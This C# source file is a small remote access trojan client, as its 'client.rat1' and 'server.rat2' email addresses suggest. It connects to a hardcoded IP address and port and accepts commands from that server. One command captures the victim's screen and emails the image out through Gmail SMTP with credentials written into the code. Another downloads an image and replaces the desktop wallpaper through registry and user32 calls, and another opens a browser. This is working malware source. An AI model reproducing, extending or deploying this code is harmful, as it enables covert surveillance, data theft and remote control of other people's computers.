using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.Serialization.Formatters.Binary;
using System.Net.Mail;
using System.Net.Mime;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32;




namespace ConsoleApp1
{
    class MyForm : Form
    {
        public Rectangle GetScreen()
        {
            return Screen.FromControl(this).Bounds;
        }
    }

    public class Wallpaper
    {
        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }

        [DllImport("user32.dll")]
        public static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        public static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        public static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        public static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static bool Set(string filePath, Style style)
        {
            bool Success = false;
            try
            {
                Image i = System.Drawing.Image.FromFile(Path.GetFullPath(filePath));

                Set(i, style);

                Success = true;

            }
            catch //(Exception ex)
            {
                //ex.HandleException();
            }
            return Success;
        }

        public static bool Set(Image image, Style style)
        {
            bool Success = false;
            try
            {
                string TempPath = Path.Combine(Path.GetTempPath(), "3sum.png");

                image.Save(TempPath, ImageFormat.Bmp);

                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

                switch (style)
                {
                    case Style.Stretched:
                        key.SetValue(@"WallpaperStyle", 2.ToString());

                        key.SetValue(@"TileWallpaper", 0.ToString());

                        break;

                    case Style.Centered:
                        key.SetValue(@"WallpaperStyle", 1.ToString());

                        key.SetValue(@"TileWallpaper", 0.ToString());

                        break;

                    default:
                    case Style.Tiled:
                        key.SetValue(@"WallpaperStyle", 1.ToString());

                        key.SetValue(@"TileWallpaper", 1.ToString());

                        break;

                }

                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, TempPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

                Success = true;

            }
            catch //(Exception ex)
            {
                //ex.HandleException();
            }
            return Success;
        }

    }

    class Program
    {

        static void Connect(String server, String message)
        {
            try
            {
                // Create a TcpClient.
                // Note, for this client to work you need to have a TcpServer 
                // connected to the same address as specified by the server, port
                // combination.

                Int32 port = 13001;
                TcpClient client = new TcpClient(server, port);

                // Translate the passed message into ASCII and store it as a Byte array.
                Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);

                // Get a client stream for reading and writing.
                //  Stream stream = client.GetStream();

                NetworkStream stream = client.GetStream();

                // Send the message to the connected TcpServer. 
                stream.Write(data, 0, data.Length);

                //Console.WriteLine("Sent: {0}", message);

                // Receive the TcpServer.response.

                // Buffer to store the response bytes.
                data = new Byte[256];

                // String to store the response ASCII representation.
                String responseData = String.Empty;

                // Read the first batch of the TcpServer response bytes.
                Int32 bytes = stream.Read(data, 0, data.Length);

                responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                // Console.WriteLine("Received: {0}", responseData);
                if (responseData == "OK")
                {
                    //Console.WriteLine("aici");
                    while (true)
                    {
                        if (Execute(stream) == "exit")
                            break;
                    }

                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }

        }
       


    public static AlternateView getEmbeddedImage(String filePath)
        {
            LinkedResource res = new LinkedResource(filePath);
            res.ContentId = Guid.NewGuid().ToString();
            string htmlBody = @"<img src='cid:" + res.ContentId + @"'/>";
            AlternateView alternateView = AlternateView.CreateAlternateViewFromString(htmlBody, null, MediaTypeNames.Text.Html);
            alternateView.LinkedResources.Add(res);
            return alternateView;
        }

        public static void CaptureScreenshot(MyForm mf)
        {

            Rectangle bounds = mf.GetScreen();
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                }
                var i = new Bitmap(bitmap);
                i.Save("D://test.jpg", ImageFormat.Jpeg);

                MailMessage mail = new MailMessage();
                mail.IsBodyHtml = true;
                mail.AlternateViews.Add(getEmbeddedImage("D://test.jpg"));
                mail.From = new MailAddress("client.rat1@gmail.com");
                mail.To.Add("server.rat2@gmail.com");
                mail.Subject="screenshot";

                SmtpClient smtp = new SmtpClient("smtp.gmail.com");
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                smtp.Credentials = new NetworkCredential("client.rat1@gmail.com", "Client123");
                smtp.Send(mail);
            }
        }

        static string Execute(NetworkStream stream)
        {
            try
            {
               Byte[] data = new Byte[256];

                Byte[] mssg = System.Text.Encoding.ASCII.GetBytes("exit");
                // String to store the response ASCII representation.
                String responseData = String.Empty;
               // Console.WriteLine("aici");
                // Read the first batch of the TcpServer response bytes.
                Int32 bytes;

                while ((bytes = stream.Read(data, 0, data.Length)) != 0)
                {
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                   // Console.WriteLine(responseData);
                    if (responseData == "gmail")
                    {
                        //deschide link
                        System.Diagnostics.Process.Start("http://gmail.com");

                    }
                    else if (responseData == "exit")
                    {
                        return responseData;
                    }
                    else if (responseData == "capture")
                    {
                        MyForm mf = new MyForm();
                        CaptureScreenshot(mf);
                    }
                    else if (responseData == "3sum")
                    {
                        using (var client = new WebClient())
                        {
                            client.DownloadFile("https://i.imgur.com/055ha8B.png", "3sum.png");
                        }
                        string dir = Directory.GetCurrentDirectory();
                        dir += "\\3sum.png";

                        Wallpaper.Set(dir, Wallpaper.Style.Centered);
                    }
                    else
                        break;
                }
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }

            return "waiting...";
        }

        static void Main(string[] args)
        {
           
            IPHostEntry hostInfo = Dns.GetHostByName("192.168.21.129");
            // Get the IP address list that resolves to the host names contained in the 
            // Alias property.
            IPAddress[] address = hostInfo.AddressList;
            // Get the alias names of the addresses in the IP address list.
            String[] alias = hostInfo.Aliases;

            Connect(address[0].ToString(), "muie\n");

        }
    }
}
